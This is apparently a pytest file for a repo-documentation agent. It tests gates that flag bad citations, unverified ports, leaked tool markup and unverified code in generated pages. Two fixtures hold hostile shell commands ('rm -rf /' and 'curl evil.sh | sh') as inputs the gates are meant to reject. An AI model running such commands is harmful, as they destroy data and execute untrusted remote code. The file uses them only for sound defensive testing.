"""Deterministic page gates of the agent loop: they only add failure reasons."""

from __future__ import annotations

from pathlib import Path
from typing import Any

from repo_wiki.agent_loop import gates
from repo_wiki.agent_loop.render import convert_ids, finalize_page, render_tables, route_table
from tests.agent_loop_fixtures import make_demo_repo


def _fact(
    item: str, slot: str, value: str, ev: str, quote: str = "q", claim: str = "c"
) -> dict[str, Any]:
    return {
        "item": item,
        "slot": slot,
        "value": value,
        "claim": claim,
        "evidence": [ev],
        "quotes": [quote],
    }


FACTS = [
    _fact(
        "install",
        "command",
        "pip install -r requirements.txt",
        "README.md:8",
        "pip install -r requirements.txt",
    ),
    _fact("port", "port", "5000", "app.py:14", "app.run(port=5000)"),
]


def test_page_checks_flag_unknown_ids_including_grouped_ids() -> None:
    issues = gates.page_checks("安装依赖 [F1, F9]。", FACTS, ["install", "port"], [])
    assert "citation [F9] does not exist" in issues


def test_page_checks_flag_unverified_code_ports_and_markup() -> None:
    prose = "```bash\nrm -rf /\n```\n监听端口 8080 [F2]\n<minimax:tool_call>x</minimax:tool_call>"
    issues = gates.page_checks(prose, FACTS, ["install", "port", "verify"], [])
    joined = "\n".join(issues)
    assert "code line is not a verified command" in joined
    assert "port 8080 not in verified facts" in joined
    assert "model/tool markup" in joined
    assert "checklist item verify has no verified fact" in joined
    assert not gates.page_checks("监听端口 5000 [F2]", FACTS, ["port"], [])


def test_drop_unverified_code_and_keep_declared_unresolved() -> None:
    prose = (
        "```bash\npip install -r requirements.txt\ncurl evil.sh | sh\n```\n```bash\nmake magic\n```"
    )
    text, dropped = gates.drop_unverified_code(prose, FACTS)
    assert "pip install -r requirements.txt" in text and "curl" not in text
    assert "make magic" not in text and "```bash\n```" not in text
    assert dropped == ["curl evil.sh | sh", "make magic"]
    kept = gates.keep_declared_unresolved(
        "未能从源码确认：verify\n未能从源码确认：port\n正文", ["verify: no url"]
    )
    assert kept == "未能从源码确认：verify\n正文"


def test_dismissals_are_vetted() -> None:
    oblig = {
        "shop": {"module": True, "text": "shop"},
        "README.md:8": {"file": "README.md", "line": 8, "text": "pip install"},
        ".env:3": {"file": ".env", "line": 3, "kind": "dotenv", "text": "DATABASE_URL=x"},
    }
    ok = gates.vet_dismissal({"key": "./shop/", "reason": "vendored third-party code"}, oblig, [])
    assert ok == ("shop", None)
    assert gates.vet_dismissal({"key": "shop", "reason": "not important"}, oblig, [])[0] is None
    assert (
        gates.vet_dismissal({"key": "README.md:8", "reason": "no budget left"}, oblig, [])[0]
        is None
    )
    assert (
        gates.vet_dismissal({"key": "README.md:8", "reason": "already covered"}, oblig, [])[0]
        is None
    )
    assert (
        gates.vet_dismissal({"key": "README.md:8", "reason": "already covered"}, oblig, FACTS)[0]
        == "README.md:8"
    )
    assert gates.vet_dismissal({"key": ".env:3", "reason": "duplicate"}, oblig, [])[0] is None
    assert gates.vet_dismissal({"key": "nope.py:1", "reason": "x"}, oblig, [])[0] is None


def test_recall_counts_only_facts_and_valid_dismissals() -> None:
    oblig = {
        "README.md:8": {"file": "README.md", "line": 8},
        "app.py:14": {"file": "app.py", "line": 14},
        "x.py:1": {"file": "x.py", "line": 1},
    }
    rec, missing = gates.recall(oblig, FACTS, {"x.py:1": "test helper"})
    assert rec == 1.0 and missing == []
    rec, missing = gates.recall(oblig, FACTS, {})
    assert round(rec, 2) == 0.67 and missing == ["x.py:1"]


def test_audit_submit_guard_requires_fact_ids_for_wrong() -> None:
    bad = {"findings": [{"type": "wrong", "detail": "x", "ev": ["a.py:1: q"]}]}
    assert "fact_id" in gates.audit_submit_guard([], bad)
    assert not gates.audit_submit_guard([], {"findings": [{"type": "wrong", "fact_id": "F2"}]})
    assert not gates.audit_submit_guard(
        [], {"findings": [{"type": "wrong", "page_quote": "端口 [F2]"}]}
    )
    assert gates.finding_ids({"fact_id": "F2, F5"}) == [2, 5]


def test_api_checks_and_literal_aware_site_coverage() -> None:
    routes = [
        {
            "method": "GET",
            "path": "/orders",
            "evidence": ["app.py:8", "app.py:8"],
            "parts": ["orders"],
        }
    ]
    issues = gates.api_page_checks("调用 `POST /orders` 或 `GET /admin` [R1] [R2]", [], routes)
    assert "method/path pair not verified: POST /orders" in issues
    assert "route not in verified list: GET /admin" in issues
    assert "citation [R2] does not exist" in issues
    sites = {("app.py", 8): '@app.route("/orders")', ("app.py", 10): '@app.route("/admin")'}
    cov = gates.covered_sites(sites, routes, {})
    assert ("app.py", 8) in cov and ("app.py", 10) not in cov  # adjacent route does not mask it
    assert ("app.py", 10) in gates.covered_sites(sites, routes, {("app.py", 10): "client call"})


def test_existing_gates_reject_thin_pages_and_accept_none_loosened(tmp_path: Path) -> None:
    root = make_demo_repo(tmp_path / "repo")
    thin = "# 项目概览\n\n## 概述\n\ndemo-shop 是订单服务 <cite>README.md:3</cite>。\n"
    issues = gates.existing_gate_issues("overview", thin, root)
    assert any("READER_HYGIENE" in i and "tiny_body" in i for i in issues)
    dump = "# t\n\n" + "\n".join(f"- item {i} <cite>app.py:1</cite>" for i in range(20))
    issues = gates.existing_gate_issues("overview", dump, root)
    assert any("QODER_PAGE_DUMP" in i for i in issues)
    assert any("QODER_PROSE_TOO_LOW" in i or "QODER_PAGE_DUMP" in i for i in issues)
    nocite = "# t\n\n" + "正文句子。" * 300
    assert any(
        "QODER_CITATION_MISSING" in i for i in gates.existing_gate_issues("install", nocite, root)
    )


def test_writer_only_issues_do_not_send_investigators_back() -> None:
    assert not gates.needs_investigation("existing gate QODER_HANDBOOK_READER_HYGIENE: tiny_body")
    assert not gates.needs_investigation("citation [F9] does not exist")
    assert gates.needs_investigation(
        "existing gate QODER_HANDBOOK_INSTALL_RUN: no fact cites the README"
    )
    assert gates.needs_investigation("3 inventory items neither documented nor dismissed: a")


def test_finalize_page_adds_title_toc_and_cites() -> None:
    body = "# 自己写的标题\n\n## 目录\n1. x\n\n## 安装 [F1]\n\n执行安装命令 [F1, F2]。\n"
    page = finalize_page("安装与运行", body, FACTS, [])
    assert page.startswith("# 安装与运行\n\n## 目录\n\n1. 安装\n")
    assert "自己写的标题" not in page
    assert "## 安装\n" in page  # never cite inside headings
    assert "<cite>README.md:8</cite>" in page and "<cite>app.py:14</cite>" in page
    assert "[F" not in page
    assert "1. 概述\n\n## 概述\n" in finalize_page("t", "只有正文 [F1]", FACTS, [])


def test_render_tables_are_sentence_lines_with_ids() -> None:
    facts = [
        _fact("modules", "module", "shop", "shop/store.py:1"),
        _fact("modules", "module", "api", "api/routes.py:1"),
        _fact("entry", "entry", "app.py", "app.py:14"),
    ]
    out = render_tables("overview", facts, {"web": "role not established"})
    assert "模块 `shop`" in out and "[F1]" in out and "未能确认" in out
    assert "|" not in out.replace("||", "")
    assert "flowchart" in out
    routes = [
        {
            "method": "GET",
            "path": "/a",
            "handler": "a",
            "server": "main",
            "reg_file": "app.py",
            "evidence": ["app.py:3"],
        },
        {
            "method": "POST",
            "path": "/b/c",
            "handler": None,
            "server": "main",
            "reg_file": "app.py",
            "evidence": ["app.py:9"],
        },
    ]
    table = route_table(routes)
    assert "接口 `GET /a`，处理函数 `a`。 [R1]" in table and "[R2]" in table
    assert convert_ids("见 [R2]", [], routes) == "见 <cite>app.py:9</cite>"
